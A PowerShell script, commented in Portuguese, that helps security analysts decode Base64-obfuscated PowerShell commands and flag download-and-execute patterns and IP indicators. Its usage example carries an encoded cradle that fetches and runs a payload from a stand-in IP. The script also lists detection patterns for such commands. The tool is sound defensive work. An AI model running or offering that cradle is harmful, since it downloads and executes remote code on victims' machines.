<#
.SYNOPSIS
    Decodifica strings Base64 usadas em comandos PowerShell ofuscados
.DESCRIPTION
    Ferramenta para analistas MDR decodificarem comandos suspeitos
.EXAMPLE
    .\decodificador-base64.ps1 -Base64String "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAJwApAA=="
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$Base64String,
    
    [switch]$Analyze
)

function ConvertFrom-Base64String {
    param([string]$Base64)
    
    try {
        # PowerShell frequentemente usa UTF-16LE para codificação
        $bytes = [Convert]::FromBase64String($Base64)
        $decoded = [System.Text.Encoding]::Unicode.GetString($bytes)
        
        # Se não funcionar, tenta UTF-8
        if ($decoded -match "[^\x20-\x7E]") {
            $decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
        }
        
        return $decoded
    }
    catch {
        return "Erro na decodificação: $_"
    }
}

function Analyze-Command {
    param([string]$Command)
    
    Write-Host "`n=== ANÁLISE DO COMANDO ===" -ForegroundColor Cyan
    
    # Detectar padrões maliciosos
    if ($Command -match "IEX|Invoke-Expression") {
        Write-Host "[!] Detected: IEX (Invoke Expression) - Execução remota" -ForegroundColor Red
    }
    
    if ($Command -match "DownloadString|WebClient|Invoke-WebRequest") {
        Write-Host "[!] Detected: Download de payload" -ForegroundColor Red
    }
    
    if ($Command -match "http://|https://") {
        $url = $matches[0]
        Write-Host "[!] Detected: URL maliciosa - $url" -ForegroundColor Red
    }
    
    if ($Command -match "payload\.exe|malware\.exe") {
        Write-Host "[!] Detected: Executável suspeito" -ForegroundColor Red
    }
    
    # Extrair IoCs
    if ($Command -match "(\d{1,3}\.){3}\d{1,3}") {
        $ip = $matches[0]
        Write-Host "[i] IoC: IP Address - $ip" -ForegroundColor Yellow
    }
}

# Main execution
Write-Host "=== DECODIFICADOR BASE64 ===" -ForegroundColor Green
Write-Host "String Base64: $Base64String`n"

$decodedCommand = ConvertFrom-Base64String -Base64 $Base64String
Write-Host "COMANDO DECODIFICADO:" -ForegroundColor Green
Write-Host $decodedCommand -ForegroundColor White

if ($Analyze) {
    Analyze-Command -Command $decodedCommand
}

# Exportar para arquivo
$output = @{
    Base64 = $Base64String
    Decoded = $decodedCommand
    Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
} | ConvertTo-Json

$output | Out-File -FilePath "decoded_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"